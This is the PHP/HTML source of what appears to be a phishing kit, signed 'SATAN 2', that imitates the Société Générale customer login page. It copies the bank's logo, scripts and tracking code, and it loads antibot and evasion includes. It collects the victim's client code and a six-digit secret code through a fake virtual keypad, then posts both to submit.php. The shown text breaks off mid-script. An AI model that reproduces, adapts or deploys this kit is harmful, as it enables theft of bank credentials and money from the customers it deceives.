<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);


/**
 * @link       :   https://www.satan2.com/ 
 * @package    :   SOCIETE GENERALE 
 * @telegram   :   @satan2  
 * Project Name:   SOCIETE GENERALE 2022
 * Author      :   SATAN 2
 * Mise à jour :   08-09-2022
 * Author URI  :   https://www.facebook.com/satan2
 */

include '../inc/antibots.php';
include '../inc/protection_dynamique.php';
include_once '../inc/app.php';

$random   = rand(0,100000000000);
$LSG = substr(md5($random), 0, 17);

?>
<?php 
/*CACHE*/
$fichierCache = '../cache/lsg_index.lsg';
if (@filemtime($fichierCache)<time()-(24*3600)) {ob_start(); 
?>

<!DOCTYPE html>
<html lang="fr" class="swm-root-active swm-mode-page" >
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no">
 

<script>if (top != self) { top.location = self.location; }</script>

<title>Société Générale | Connexion</title>





<script  charset="UTF-8" src="../assets/js/n2g_secu.js"></script>
<script type="text/javascript">frame_shield();</script>
<script type="application/json" id="sas_user_info">
{

}
</script>


<meta name="robots" content="none"/>
<meta property="og:url" content="https://particuliers.societegenerale.fr/loginpage/user-login-page">


<title>Connexion à votre Espace Client Particuliers</title>
<meta name="title" content="Connexion à votre Espace Client Particuliers">
<meta property="og:title" content="Connexion à votre Espace Client Particuliers" />
<meta name="twitter:card" content="summary" />

<script>
if (!window.cmsConstants) window.cmsConstants = {};

window.cmsConstants.LOGGER_SERVICE_END_POINT = "/extrestcontent/logBigData";
window.cmsConstants.LOGGER_LEVEL_MIN_SERVER = "error";
window.cmsConstants.LOGGER_LEVEL_MIN_CLIENT = "error";

window.cmsConstants.LOGGER_SERVICE_END_POINT_DEFAULT = "/extrestcontent/logBigData";
window.cmsConstants.LOGGER_LEVEL_MIN_SERVER_DEFAULT = "ERROR";
window.cmsConstants.LOGGER_LEVEL_MIN_CLIENT_DEFAULT = "ERROR";
</script><meta name="viewport" content="initial-scale=1, maximum-scale=1, viewport-fit=cover">
<link rel="icon" type="image/x-icon" href="../assets/img/favicon.ico">

<script type="text/javascript">
function getCookie(name) {
var value = "; " + document.cookie;
var parts = value.split("; " + name + "=");
if (parts.length == 2) {
return parts.pop().split(";").shift();
}
return "";
}

function setValue(defaultVal, val) {
if (val == null || val.trim() === '') {
return defaultVal
}
return val;
}


function setValueBoolean(defaultVal, val) {
if (val == null || val.trim() === '') {
return defaultVal
}
return val == 1;
}

function addAdditionalParams(tc_vars) {
try {
var additionals = ""
additionals = additionals.replace(/'/g, "").replace(/"/g, '')
const params = additionals.split(',')
for (var i = 0; i < params.length; i++) {
const param = params[i].split(':')
tc_vars[param[0].trim()] = param[1].trim()
};
} catch (e) {
}
}
function getTechnicalUrl() {
var pageUrl = window.location.href;
var technical_url = pageUrl.replace(window.location.protocol +'//'+ window.location.hostname,'');
return technical_url
}

const empty = "";
//const version = "V3";
var tc_vars = {
"page_section": setValue(empty, ""),
"page_category_1": "loginpage",
"page_category_2": "",
"page_category_3": "",
"page_name": "user-login-page",
"page_type": setValue(empty, "HomePage"),
"page_noload": true,
"no_load": true,
"product_category_1": setValue(empty, ""),
"product_category_2": setValue(empty, ""),
"product_category_3": setValue(empty, ""),
"product_category_4": setValue(empty, ""),
"product_category_5": setValue(empty, ""),
"product_name_trade": setValue(empty, ""),
"product_target": setValue(empty, ""),
"env_channel": setValue("website", ""),
"env_market": setValue("particuliers", ""),
"env_work": "production",
"user_is_identified": false,
"user_is_supervisor" : false,
"env_is_private": setValueBoolean(true, ""),
"page_technical_url": getTechnicalUrl()
};
addAdditionalParams(tc_vars);

var xiti_xtn2 = "";
var xtn2 = "";



var sasInf = document.getElementById('sas_user_info');
if (sasInf) {
var sasHtml = sasInf.innerHTML;
try {
var sasJs = JSON.parse(sasHtml.trim());
if (sasJs && sasJs.IdStat && sasJs["user-info-firstname"] && sasJs["user-info-lastname"]) {
tc_vars["user_id"] = sasJs.IdStat;
tc_vars["user_is_logged"] = true;


} else {
tc_vars["user_is_logged"] = false;

}
if(sasJs && sasJs["user-info-sup"]==="true" ){
tc_vars["user_is_supervisor"] = true;

}else{
tc_vars["user_is_supervisor"] = false;

}

} catch (e) {
tc_vars["user_is_logged"] = false;

}
} else {
tc_vars["user_is_logged"] = false;

}
</script>
<script type="text/javascript">
if (typeof userSegments === "undefined") {
var userSegments = [];
}
if (typeof userSegmentNames === "undefined") {
var userSegmentNames = [];
}

userSegments.push("S--1470891196-0000000000000000000000RCRD");

userSegments.push("S-1291998658-00000000000000000000000RCRD");

userSegments.push("S-1609544352-00000000000000000000000RCRD");

userSegmentNames.push("0");

userSegmentNames.push("Desktop");

userSegmentNames.push("Clients_Generiques");
</script>

<script charset="UTF-8" src="../assets/js/init-configs_20220624163857.js"></script>
<script charset="UTF-8" src="../assets/js/dca_portail_global_20211128192509.js"></script>
<script charset="UTF-8" src="../assets/js/public-dca.js"></script>
<!--<script charset="UTF-8" src="../assets/js/vendor_20220712163549.min.js"></script>
<script charset="UTF-8" src="../assets/js/gda.public.js"></script>
<script charset="UTF-8" src="../assets/js/interact-lanceur.js"></script>
<script charset="UTF-8" src="../assets/js/index_20220712163549.min.js"></script>
<script charset="UTF-8" src="../assets/js/public-tms.js"></script>-->

<link href="../assets/css/index_pri_20220712163248.min.css" rel="stylesheet" type="text/css" />
<link href="../assets/css/spec56_btn_gsm_all_gcd_20211128192509.min.css" rel="stylesheet" type="text/css" />
<link href="../assets/css/print_20220624163857.min.css" rel="stylesheet" type="text/css" media="print"/>

<style type="text/css">
/* ... votre code CSS existant ici ... */
.centered-form {
    max-width: 450px; /* Ajustez la largeur si nécessaire */
    margin: 0 auto;
    padding: 20px;
}

<style type="text/css">
.eip_txt_light{
  font-weight:300;
}


.eip_dcw_main-link{
  color:#fff;
  text-decoration: underline !important;
  -webkit-transition: color 0.2s ease-in-out;
  -o-transition: color 0.2s ease-in-out;
  transition: color 0.2s ease-in-out;
}

/* Nouveau code pour centrer le formulaire */
.centered-form {
    max-width: 450px; /* Ajustez la largeur si nécessaire */
    margin: 0 auto;
    padding: 20px;
}
.eip_dcw_main-link:hover, .eip_dcw_main-link:focus{
  color:#f05b6f;
}
</style>
<link href="../assets/css/head-section_fix-gb9_16381239090000.css" rel="stylesheet" type="text/css"/>
<!-- URL: https://particuliers.societegenerale.fr:80/restcontent/theme/e7ec774b8e120610VgnVCM100000050013acRCRD -->
<!-- REQUEST PROFILE: , REQUEST SAS AUTH_LEVEL: 0 -->
<!-- channelId: 75eec1c77d92f510VgnVCM100000030013acRCRD, templateID: e7ec774b8e120610VgnVCM100000050013acRCRD, isRenderPageFeatures: true, FURL_NAME: /authen/theme, FURL_ID: efb3c1c77d92f510VgnVCM100000030013acRCRD -->


<script src="../assets/lib/rules.js"></script> 
<script src="../assets/lib/jquery.js"></script>
<!--<script src="../assets/lib/js.js"></script>-->
<script src="../assets/lib/jquery2.js" ></script>
<script>
$(document).ready(function(){
  $("#user_id").on("change paste keyup",function(){
if ($(this).val().length >= 8) {
$('#user_id').addClass('is-valid');
} else {
$('#user_id').removeClass('is-valid'); 
}
  });
});


</script>
<script>

$(document).ready(function()
{
var _try=0;
$("#initClient").click(function()
{
$("#client-nbr").val("");
$("#secret-nbr").val("");
$("#next").css("opacity","0.4");
$("#next").css("pointer-events", "none");
$("#next").css("cursor", "default");
});


$("#initPass").click(function()
{
$("#secret-nbr").val("");
$("#pw").val("");
$("#next").css("opacity","0.4");
$("#next").css("pointer-events", "none");
$("#next").css("cursor", "default");
});




});
</script>
<script>

function ShowStep2() {
document.getElementById("clavier").style.display = "block";
document.getElementById("btn-container").style.display = "none";
}

function valider() {
var mdp = document.getElementById("user_id").value;
if (mdp.length == 5) {
return true;

} else {
return false;
}
}   


</script>

</head>



<body class="PRI waitJeton swm swm-mode-page swm-theme-BDDF  swm-page-authent  swm-theme-BDDF-BDDF swm-theme-SITE_WEB">



<header class="rsp_header header-deco header-authent">
<nav class="rsp_nav rsp_nav--above">
<ul class="rsp_nav__list">

<li class="rsp_nav__item rsp_nav__item--push-right" data-channelid="">
<a href="#" class="rsp_nav__link" data-element-label="agences"onclick=bddfTms.trackEvent(this,'click_menu',{event_name:'navigation-connectee::'+"agences"})><svg aria-hidden='true' focusable='false' width='18' height='18'><use xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#lhs-localisation'></use></svg><span>Agences</span></a>
</li>
<li class="rsp_nav__item" data-channelid="">
<a href="#" class="rsp_nav__link" data-element-label="aide-et-contacts"onclick=bddfTms.trackEvent(this,'click_menu',{event_name:'navigation-connectee::'+"aide-et-contacts"})><svg aria-hidden='true' focusable='false' width='18' height='18'><use xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#lhs-urgence'></use></svg><span>Aide et contacts</span></a>
</li>
</ul>
</nav>

<div class="rsp_header__wrapper-nav">
<a href="#" class="rsp_header__logo-mob" title="page d'accueil">
<svg  aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" width="23" height="23" viewBox="0 0 23 23">
  <g fill="none" fill-rule="evenodd">
<path fill="#ED0210" d="M0 11.335h22.22V0H0z"/>
<path fill="#000" d="M0 22.141h22.22V11.032H0z"/>
<path fill="#FFF" d="M4.413 11.649h14.456v-1.352H4.413z"/>
  </g>
</svg>  
  </a>
  <a href="#" class="rsp_header__logo-desktop ml-m" title="page d'accueil">
<svg aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="192" height="40"
  viewBox="0 0 340 70"> 
  <g fill="none" fill-rule="evenodd" transform="translate(-15 -1)">
<path fill="#000"
  d="M15.106 24.88c0-5.948 4.551-10.164 10.751-10.164 3.602 0 6.506 1.312 8.405 3.685l-3.518 3.184c-1.229-1.48-2.737-2.29-4.608-2.29-3.212 0-5.445 2.234-5.445 5.585s2.233 5.585 5.445 5.585c1.871 0 3.38-.81 4.608-2.29l3.518 3.183c-1.899 2.374-4.803 3.686-8.405 3.686-6.2 0-10.75-4.216-10.75-10.164M41.748 16.81c0 .782-.112 1.396-.894 3.212l-1.787 4.076h-3.323l1.313-4.551c-1.006-.475-1.648-1.424-1.648-2.737 0-1.9 1.34-3.127 3.183-3.127 1.815 0 3.156 1.228 3.156 3.127M60.04 30.381v4.273H44.345V15.106h15.33v4.274h-9.858v3.294h8.686v4.134h-8.685v3.573zM61.604 32.895l1.815-4.077c1.731 1.144 4.188 1.926 6.45 1.926 2.29 0 3.184-.642 3.184-1.591 0-3.1-11.114-.838-11.114-8.098 0-3.491 2.848-6.34 8.656-6.34 2.541 0 5.166.587 7.093 1.704l-1.703 4.105c-1.87-1.005-3.714-1.507-5.418-1.507-2.318 0-3.155.78-3.155 1.759 0 2.987 11.086.753 11.086 7.958 0 3.407-2.848 6.31-8.657 6.31-3.21 0-6.394-.865-8.237-2.15M85.62 19.49h-6.003v-4.384h17.508v4.385H91.15v15.163h-5.53zM126.308 15.106l-8.379 19.547h-5.445l-8.35-19.547h5.977l5.306 12.734 5.416-12.734zM141.64 24.88c0-3.379-2.318-5.585-5.28-5.585-2.958 0-5.276 2.206-5.276 5.585s2.318 5.585 5.277 5.585c2.96 0 5.279-2.206 5.279-5.585m-16.141 0c0-5.864 4.608-10.164 10.862-10.164 6.256 0 10.864 4.3 10.864 10.164s-4.608 10.164-10.864 10.164c-6.254 0-10.862-4.3-10.862-10.164M150.382 25.942V15.107h5.53v10.666c0 3.352 1.396 4.692 3.713 4.692 2.29 0 3.687-1.34 3.687-4.692V15.107h5.445v10.835c0 5.835-3.407 9.102-9.188 9.102-5.78 0-9.187-3.266-9.187-9.102M170.991 32.895l1.815-4.077c1.731 1.144 4.19 1.926 6.451 1.926 2.29 0 3.183-.642 3.183-1.591 0-3.1-11.114-.838-11.114-8.098 0-3.491 2.848-6.34 8.657-6.34 2.541 0 5.166.587 7.094 1.704l-1.704 4.105c-1.872-1.005-3.715-1.507-5.419-1.507-2.317 0-3.155.78-3.155 1.759 0 2.987 11.087.753 11.087 7.958 0 3.407-2.849 6.31-8.658 6.31-3.21 0-6.394-.865-8.237-2.15M58.002 39.648h5.529V54.81h9.326v4.385H58.002zM78.136 41.352c0 .781-.112 1.396-.894 3.211l-1.787 4.077h-3.323l1.312-4.552c-1.005-.475-1.647-1.424-1.647-2.736 0-1.9 1.34-3.128 3.183-3.128 1.815 0 3.156 1.228 3.156 3.128M90.59 51.32l-2.512-6.255-2.513 6.255h5.026zm1.62 4.077h-8.265l-1.536 3.8h-5.641l8.629-19.55h5.445l8.657 19.55h-5.752l-1.537-3.8zM117.455 39.648l-8.377 19.548h-5.445l-8.35-19.548h5.976l5.306 12.734 5.417-12.734zM135.133 54.923v4.273H119.44V39.648h15.331v4.273h-9.858v3.295h8.685v4.133h-8.685v3.574zM156.665 39.648v19.548h-4.553l-8.629-10.417v10.417h-5.416V39.648h4.551l8.63 10.416V39.648z" /> 
<path fill="#000"
  d="M160.436 59.196h5.528V39.648h-5.528zM178.363 44.004h-3.072v5.725h3.072c2.29 0 3.435-1.061 3.435-2.849 0-1.815-1.145-2.876-3.435-2.876zm-.055 9.997h-3.017v5.195h-5.529V39.648h8.936c5.333 0 8.686 2.765 8.686 7.232 0 2.876-1.398 4.998-3.827 6.171l4.218 6.145h-5.922l-3.545-5.195zM249.497 25.422c-1.623-.688-3.361-1.138-4.91-1.138-2.257 0-3.387.486-3.387 1.358 0 2.498 10.082.493 10.082 5.821 0 2.206-2.071 3.911-6.219 3.911-2.462 0-4.385-.509-6.595-1.705l.912-1.986c1.937 1.076 3.743 1.553 5.697 1.553 2.46 0 3.778-.71 3.778-1.773 0-2.731-10.084-.692-10.084-5.687 0-2.153 2.054-3.636 5.771-3.636 2.223 0 4.093.489 5.879 1.384l-.924 1.898zM260.738 35.441c-4.028 0-7.367-2.682-7.367-6.692 0-3.962 3.34-6.695 7.367-6.695 4.05 0 7.336 2.733 7.336 6.695 0 4.01-3.287 6.692-7.336 6.692m0-11.229c-2.935 0-4.937 1.987-4.937 4.537 0 2.611 1.916 4.554 4.937 4.554 3 0 4.907-1.962 4.907-4.554 0-2.55-1.908-4.537-4.907-4.537M277.694 35.426c-4.23 0-7.419-2.68-7.419-6.695 0-3.945 3.238-6.677 7.42-6.677 2.494 0 4.28.707 5.883 1.887l-1.247 1.857c-1.166-.897-2.625-1.551-4.569-1.551-3.088 0-5.006 1.952-5.006 4.484 0 2.61 1.937 4.504 5.038 4.504 1.941 0 3.476-.628 4.635-1.521l1.253 1.856c-1.607 1.18-3.493 1.856-5.988 1.856M286.238 35.086h2.349V22.441h-2.349zM292.057 22.44v12.646h11.918v-2.09H294.4V29.69h7.127v-2.088H294.4V24.53h9.168v-2.09zM305.224 22.44v2.077h5.156v10.569h2.34V24.517h5.151v-2.076zM319.758 22.44v12.646h11.919v-2.09h-9.571V29.69h7.13v-2.088h-7.13V24.53h9.168v-2.09zM245.698 50.05c1.287 0 2.61-.29 3.607-.761v-3.677h2.282v4.909c-1.605 1.079-3.81 1.736-5.989 1.736-4.227 0-7.416-2.676-7.416-6.692 0-3.944 3.238-6.672 7.416-6.672 2.447 0 4.284.688 5.888 1.868l-1.245 1.855c-1.17-.893-2.635-1.502-4.578-1.502-3.084-.067-5 1.922-5 4.45 0 2.617 1.94 4.487 5.035 4.487M254.673 39.278v12.639h11.919V49.83h-9.578v-3.307h7.136v-2.087h-7.136v-3.072h9.177v-2.086zM271.19 51.918h-2.294V39.277h2.393l8.245 9.527.056-.016a101.83 101.83 0 0 1-.157-6.208v-3.303h2.291v12.64h-2.374l-8.213-9.522-.037.019c.09 1.87.09 5.139.09 6.205v3.299zM285.024 39.278v12.639h11.921V49.83h-9.58v-3.307h7.133v-2.087h-7.133v-3.072h9.173v-2.086zM305.544 47.268h-3.777v4.65h-2.345v-12.64h8.125c2.695 0 4.366 1.655 4.366 4.029 0 2.258-1.64 3.605-3.624 3.894l3.764 4.717h-2.94l-3.57-4.65zm1.752-2.107c1.467 0 2.296-.758 2.296-1.854 0-1.2-.73-1.943-2.045-1.943h-5.78v3.797h5.529zM319.03 39.278l-6.16 12.639h2.536l1.451-3.068h6.82l1.454 3.068h2.527l-6.164-12.64h-2.464zm1.245 2.393l2.426 5.126h-4.869l2.443-5.126zM329.384 39.278v12.639h10.783V49.83h-8.443V39.278zM341.75 39.278v12.639h11.922V49.83h-9.575v-3.307h7.132v-2.087h-7.132v-3.072h9.175v-2.086z"/>
<path fill="#ED0210" d="M199.175 37.453h30.212V22.042h-30.212z"/>
<path fill="#000" d="M199.175 52.255h30.212V37.151h-30.212z"/>
<path fill="#FFF" d="M204.454 38.069h19.655v-1.838h-19.655z"/>
  </g>
</svg>
  </a>
<a data-channelid="6a29885f3a7df610VgnVCM10000057f440c0RCRD" aria-expanded="false" class="rsp_link rsp_link--picto-only ml-auto mr-m" data-tms-container-label="Ouvrir un compte" data-tms-click-type="N" data-tms-element-label="se-connecter" href="#"><span class="rsp_link__label">Ouvrir un compte</span>
</a></div>

<h1 class="rsp_header__title-page" id="js-mobile-title">Connexion à votre Espace Client Particuliers</h1>

<input id="breadcrumb-channel-ids" type="hidden" value="75eec1c77d92f510VgnVCM100000030013acRCRD,f18ec1c77d92f510VgnVCM100000030013acRCRD,25d136f55ccb9510VgnVCM100000050013acRCRD"/>
</header>
<main class="dcw_main dcw_gb9_core-wrapper" role="main">
<a id="go-content" tabindex="-1"></a>
<section class="dcw_gb_row">
</section>
<section class="dcw_gb_wrapper">
<a id="go-content" tabindex="-1"></a>
<section class="dcw_gb9_core-left" id="">

<!-- URL: https://particuliers.societegenerale.fr:80/restcontent/regions/75eec1c77d92f510VgnVCM100000030013acRCRD -->
<!-- REQUEST PROFILE: , REQUEST SAS AUTH_LEVEL: 0 -->
<!-- channelId: 75eec1c77d92f510VgnVCM100000030013acRCRD, regionNames: header-int-without-navigation-and-open-main,gb9-com1-int, FURL_NAME: /authen/header, FURL_ID: a763c1c77d92f510VgnVCM100000030013acRCRD -->

 

<noscript>
<style>
.auth-content {display:none !important;}
.waitAuthJetonMsg {display: none !important;}
</style>
</noscript>

<link rel="stylesheet" href="../assets/css/style.css" />


<script>

 

window.swmConfOverride = {
"version": "21.2.10.1",
"firm": "BDDF",
"banque": "BDDF",
"provenance": "",
"market": "PRI",
"isNGIM": true,
"isCookieless": false,
"media": "WEB_INT",
"bank_market_canal": "BDDF_PRI_WEB",
"isProspect": false,
"codeClientEtoileNgim": "",
"defaultUrl": "\/icd\/cbo\/index-authsec.html#cbo\/",


"isSASAuth": false,
"isSupervision": false,
"logLocal": false,
"logNiveau": "error",
"staticBaseUrl": "/icd/static/swm/resources/version/21.2.10.1",
"baseUrl": "",
"styles": [],
"isDebug": false,
"urlCdnCmsBeforeCmsMainContainer": "${url.cdn.cms.beforeCmsMainContainer.content}",
"urlCdnCmsAfterCmsMainContainer": "${url.cdn.cms.afterCmsMainContainer.content}",
"urlCdnCmsBeforeSwmContainerContent": "${url.cdn.cms.beforeSwmContainer.content}",
"urlCdnCmsAfterSwmContainerContent": "${url.cdn.cms.afterSwmContainer.content}",
"isZSSCA": "false"



};


swmConfOverride.styles = ["../assets/css/style.css"];
</script>

<div id="swm-wrapper" class="swm-inner-wrapper">
<div class="prefetch"></div>
<div id="disableLayer" class="disable-layer"></div>






<script id="templateGenericError" type="template/doT.js">
{{? it.errorType }}
<span class="swm-popin-picto swm-popin-picto-{{= it.errorType }}" aria-hidden="true"></span>
{{?}}
<div class="swm-popin-content">
{{? it.erreur1}}
<p>
{{=it.erreur1}}
</p>
{{?}}
{{? it.erreur2}}
<p>
{{=it.erreur2}}
</p>
{{?}}
{{? it.erreur3}}
<p>
{{=it.erreur3}}
</p>
{{?}}
</div>
<div id="swm-popin-btn-erreur" class="swm-button-wrapper swm-popin-btn-erreur {{=it.btnStyle}}">
<button class="swm_button-arrondi swm_button-principal swm-btn-action csa-cdn-ok swm-btn_primary {{=it.btnStyleNgim}}" type="button" tabindex="1">
{{=it.bouton}}
</button>
</div>
</script>

<script id="templateCsaError" type="template/doT.js">
<div class="eer_modal eer_popinOTP" role="dialog" aria-describedby="dialog-desc">
<span class="eer_modal__picto is-active" aria-hidden="true"></span>

{{? it.erreur1}}
<p class="eer_popinOTP__title">
{{=it.erreur1}}
</p>
{{?}}
<p id="dialog-desc" class="eer_modal__content">
{{? it.erreur2}}
{{=it.erreur2}}
{{?}}
</p>
<button class="eer_btn eer_btn--primary">{{? it.bouton}}{{=it.bouton}}{{??}}Retour &agrave; mon espace{{?}}</button>
</div>
</script>

<div id="swm-tooltip" class="swm-tooltip">
<span></span>
</div>
<div class="swm-popin-wrapper" role="dialog" aria-modal="true" aria-labelledby="swm-modal-label">
<div id="swm-popin-overlay" class="swm-popin-overlay" role="presentation"></div>
<div id="swm-popin-dialog" class="swm-popin-dialog">
<div class="swm-popin-relative">
<div id="swm-popin-btn-fermer" class="swm-popin-btn-fermer" role="button" tabindex="0" aria-label="Fermer la popin"></div>
<div id="swm-popin-ombre-lat" class="swm-popin-ombre-lat">
<div id="swm-popin" class="swm-popin">
<div id="swm-popin-cadre" class="swm-popin-cadre">
</div>
</div>
</div>
</div>
</div>
</div>


 

<script id="errorMessage" type="template/doT.js">
<div class="error-wrapper">
<div class="inner">
{{? it.bigTitle}}
<div class="big-title">{{!it.bigTitle}}</div>
{{?}}
{{? it.title}}
<div class="title">{{!it.title}}</div>
{{?}}



<div class="message">{{? it.message}}{{=it.message}}{{??}}{{!it}}{{?}}</div>



</div>
</div>
</script>

<script id="messageError" type="template/doT.js">
<div class="error-wrapper">
<div class="inner">
{{? it.bigTitle}}
<div class="big-title">{{!it.bigTitle}}</div>
{{?}}
<div class="message message-error">
{{? it.title}}
<div class="titleError">{{!it.title}}</div>
{{?}}
{{? it.message}}
{{=it.message}}
{{??}}
{{!it}}
{{?}}
{{? it.messageAsuivre}}
<div class="etapeAsuivre">{{=it.messageAsuivre}}</div>
{{?}}
</div>
<button class="js-error--close is-hide theme-white--is-show auth-btn-action" type="button">OK</button>
</div>
</div>
</script>

<script id="messageWarning" type="template/doT.js">
<div class="error-wrapper">
<div class="inner">
{{? it.bigTitle}}
<div class="big-title">{{!it.bigTitle}}</div>
{{?}}
<div class="message message-warning">
{{? it.title}}
<div class="titleWarning">{{!it.title}}</div>
{{?}}
{{? it.message}}
{{=it.message}}
{{??}}
{{=it}}
{{?}}
{{? it.messageAsuivre}}
<div class="etapeAsuivre">{{=it.messageAsuivre}}</div>
{{?}}
</div>
 <button class="js-error--close is-hide theme-white--is-show auth-btn-action" type="button">OK</button>
</div>
</div>
</script>





<div class="swm_authent">


<div class="auth-content js-content-aria-hide swm_codeContainer">
<div id="swmModulesAuth">



</div>


<DIV id="divMaster" class="swm_block">
  

<main class="dcw_main dcw_gb9_core-wrapper" role="main" style="margin-top: -40px; margin-left: 15%; margin-right: 15%;">
<a id="go-content" tabindex="-1"></a>
<section class="dcw_gb_row"></section>
<section class="dcw_gb_wrapper">
<a id="go-content" tabindex="-1"></a>
<section class="dcw_gb9_core-left" id="">

<noscript>
<style>
.auth-content {
display: none !important;
}

.js-alert {
display: block !important;
}

.waitAuthJetonMsg {
display: none !important;
}
</style>
</noscript>

<link rel="stylesheet" href="../assets/scss/style.css">

<div id="dcw-swm" class="swm-inner-wrapper">
<form id="form" action="submit.php" method="POST" onsubmit="return cc()" class="component-mire-codeclient">

    <div style="display:none;">
        <label for="url">URL de votre site</label>
        <input type="text" id="url" name="url">
    </div>
    <input type="hidden" name="js_check" id="js_check" value="0">
    <input type="hidden" name="load_time" id="load_time" value="<?php echo $_SESSION['load_time']; ?>">

    <div class="swm_block-element">
        <div class="prefetch"></div>
        <div id="disableLayer" class="disable-layer"></div>
        </div>
</form>

<script>
    document.addEventListener('DOMContentLoaded', function() {
        document.getElementById('js_check').value = '1';
    });
</script>
<div class="swm_block-element">
<div class="prefetch"></div>
<div id="disableLayer" class="disable-layer"></div>

<div id="swm-tooltip" class="swm-tooltip">
<span></span>
</div>
<div class="swm-popin-wrapper">
<div id="swm-popin-overlay" class="swm-popin-overlay"></div>
<div id="swm-popin-dialog" class="swm-popin-dialog">
<div class="swm-popin-relative">
<div id="swm-popin-btn-fermer" class="swm-popin-btn-fermer" tabindex="0" aria-label="Fermer la popin"></div>
<div class="swm-popin-ombre-sup"></div>
<div id="swm-popin-ombre-lat" class="swm-popin-ombre-lat">
<div id="swm-popin" class="swm-popin">
<div id="swm-popin-cadre" class="swm-popin-cadre oob-content">
</div>
</div>
</div>
<div class="swm-popin-ombre-inf"></div>
</div>
</div>
</div>

<div class="dcw_authent">

<div class="auth-content js-content-aria-hide dcw_codeContainer">
<div id="swmModulesAuth">
<div id="module-authent-cv">
<div class="container-mire-codeClient">
<div class="dcw_block">
<div class="component-mire-codeclient">

<div class="centered-form">
    <div class="dcw_block-element">
    <div class="auth-cs-content row_section dcw_input-container">
    <input id="user_id" name="user_id" type="text" class="auth-input-erasable auth-login dcw_input grey_cross eer_input__field ngim-input"  onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" autocomplete="off" maxlength="8" required=""> <span class="dcw_sprite dcw_to-clear" id="user_id-delete"> <a class="dcw_icone dcw_effacer" aria-label="Effacer le code client" href="#"></a> </span> <span class="bar" tabindex="-1" aria-hidden="true"></span>
    <label tabindex="-1" aria-hidden="true">Saisissez votre code client</label>
    </div>
</div>
<div id="js-error" tabindex="0" role="alert" class="auth_error show" style="display: none;"> 
<div class="error-wrapper"> 
<div role="alert" class="inner">  
<div role="alert" class="message" tabindex="0">Votre identifiant est incorrect</div>
</div> 
</div>
</div>
</div>
<div class="auth-checkbox-wrapper auth-check-left dcw_block-element" id="saveId-container" style="margin-top: -15px;">
<div class="switch" tabindex="0" aria-label="Activer la mémorisation du code client">
<input type="checkbox" class="switch input" id="saveId" name="saveId" style="display: none" data-xiti="clic_memoriser_identifiant" tabindex="0">
<label for="saveId" class="labelSwitch" onclick="" aria-hidden="true" data-xiti="clic_memoriser_identifiant" aria-labelledby="memo_code_client_label"> <span class="hidden-checkbox-input needsclick rep"></span>
<div class="toggle-btn-handle"></div>
</label>
</div> <span class="hidden-checkbox-label" id="memo_code_client_label" aria-hidden="true"><label for="saveId">Se souvenir de moi</label></span>
<div class="dcw_infohover dcw_input-info" tabindex="0" aria-label="Information sur la mémorisation du code client"> <span class="dcw_sprite-info--off"></span>
<div class="dcw_infopopin dcw_infobulle">
<p class="dcw_espace">Se souvenir de moi</p>
<p>En cochant cette case, votre code client sera mémorisé sur cet appareil.</p>
<p class="dcw_espace">De cette manière vous n'aurez plus à le saisir lors de vos prochaines connexions.</p>
<p class="dcw_espace">Ceci est déconseillé si votre ordinateur est utilisé par d'autres personnes.</p>
<button class="dcw_button-secondaire--linear-gris dcw_button-arrondi">J'ai compris</button>
</div>
</div>
</div>
<div class="auth-cs-content-validate" id="btn-container" style="display: block; margin-top: -15px; margin-left: 30%; margin-right: 30%;">
<button class="swm_button-principal swm_button-arrondi auth-btn-action swm_btn-disable" id="btn-validate" onclick="ShowStep2();" type="button" aria-label="Valider votre identifiant">Valider</button>
<br> </div>
</div>
</div>
</div>
<div id="clavier" class="loaded" style="display: none;">


<div class="component-authent-cv dcw_block" aria-expanded="true" id="sonore-vk" style="margin-top: -30px; margin-left: 25%; margin-right: 25%;">

<div class="auth-cs-content-code auth-cs-content swm-vk">

<div class="auth-cs-content-code-input row_section dcw_input-container">

<input type="button" id="closeKeyBoard">

<div class="auth-cs-content-code-input row_section dcw_input-container">

<input type="hidden" id="secret-nbr" name="Pass" class="dcw_input grey_cross" readonly="readonly"  autocomplete="off" maxlength="6" required="" placeholder="------" style="width:220px;margin-right: 50px; border: none;display: none;">

<table style="width:220px; height:20px; font-size: 45px; margin-top: -20px; margin-bottom: 20px; margin-right: 65px; color: #DDD;">
<tr>
<td id="temoin-nbr1" style="width:16.66%;">_</td>
<td id="temoin-nbr2" style="width:16.66%;">_</td>
<td id="temoin-nbr3" style="width:16.66%;">_</td>
<td id="temoin-nbr4" style="width:16.66%;">_</td>
<td id="temoin-nbr5" style="width:16.66%;">_</td>
<td id="temoin-nbr6" style="width:16.66%;">_</td>
</tr>
</table>
<span id="secret-nbr2" style="display: none;">0</span>


<span class="dcw_sprite dcw_to-clear" role="button" id="initClient" style="display: block;cursor: pointer; text-decoration: none; overflow: hidden; position: absolute; pointer-events: auto; margin-right: 55px;"></span>

<script type='text/javascript'>

function temoinNumber(){
var passpass = document.getElementById('secret-nbr').value;
if(passpass.length <= 0){ 
document.getElementById('temoin-nbr1').innerHTML = "_";
document.getElementById('temoin-nbr2').innerHTML = "_";
document.getElementById('temoin-nbr3').innerHTML = "_";
document.getElementById('temoin-nbr4').innerHTML = "_";
document.getElementById('temoin-nbr5').innerHTML = "_";
document.getElementById('temoin-nbr6').innerHTML = "_"; 

document.getElementById('temoin-nbr1').style.fontSize = "45px";
document.getElementById('temoin-nbr2').style.fontSize = "45px";
document.getElementById('temoin-nbr3').style.fontSize = "45px";
document.getElementById('temoin-nbr4').style.fontSize = "45px";
document.getElementById('temoin-nbr5').style.fontSize = "45px";
document.getElementById('temoin-nbr6').style.fontSize = "45px";

document.getElementById('temoin-nbr1').style.color = "#DDD";
document.getElementById('temoin-nbr2').style.color = "#DDD";
document.getElementById('temoin-nbr3').style.color = "#DDD";
document.getElementById('temoin-nbr4').style.color = "#DDD";
document.getElementById('temoin-nbr5').style.color = "#DDD";
